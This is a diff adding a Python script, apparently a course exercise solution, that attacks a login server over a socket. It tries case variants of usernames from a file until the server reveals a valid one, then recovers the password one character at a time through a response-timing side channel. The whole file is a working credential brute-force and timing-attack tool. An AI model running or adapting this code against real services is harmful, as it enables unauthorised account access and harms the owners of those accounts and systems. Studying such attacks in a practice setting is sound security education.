@@ -1,0 +1,74 @@
+# write your code here
+import socket
+import sys
+import itertools
+import string
+import json
+import datetime
+
+
+class Hacking:
+    def __init__(self, ip_ad, port):
+        self.ip_ad = ip_ad
+        self.port = port
+        self.address = tuple()
+        self.client_socket = socket.socket()
+        self.address = (self.ip_ad, int(self.port))
+        self.login = ''
+        self.username = ''
+        self.password = ''
+        self.client_socket.connect(self.address)
+
+    def send(self):
+        self.client_socket.send(self.login.encode())
+        response = self.client_socket.recv(1024)
+        response = response.decode()
+        return response
+
+    def close(self):
+        self.client_socket.close()
+
+    def dic_password(self):
+        my_gen = (self.password + z for z in f)
+        for y in range(0, 100000):
+            y = next(my_gen)
+            self.login = json.dumps({"login": self.username, "password": y})
+            start = datetime.datetime.now()
+            respon = self.send()
+            end = datetime.datetime.now()
+            difference = (end - start).microseconds
+            if difference > 90000:
+                self.password = y
+                my_gen = (self.password + z for z in f)
+            if respon == '{"result": "Connection success!"}':
+                print(self.login)
+                return respon
+
+
+def dic_login(file_name):
+    with open(file_name, 'r') as f:
+        for x in f:
+            x = x.rstrip('\n')
+            lu_s = ((c.lower(), c.upper()) for c in x)
+            for y in map(''.join, itertools.product(*lu_s)):
+                yield y
+
+
+args = sys.argv
+file_name = input("Please enter file name with logins:")
+f = string.digits + string.ascii_letters + ' '
+if len(args) == 3:
+    stage1 = Hacking(args[1], args[2])
+    for x in dic_login(file_name):
+        stage1.login = json.dumps({"login": x, "password": " "})
+        respon = stage1.send()
+        if respon == '{"result": "Wrong password!"}':
+            stage1.username = x
+            respon = stage1.dic_password()
+            if respon == '{"result": "Connection success!"}':
+                break
+
+    stage1.close()
+else:
+    print('Wrong number of inputs!')
+
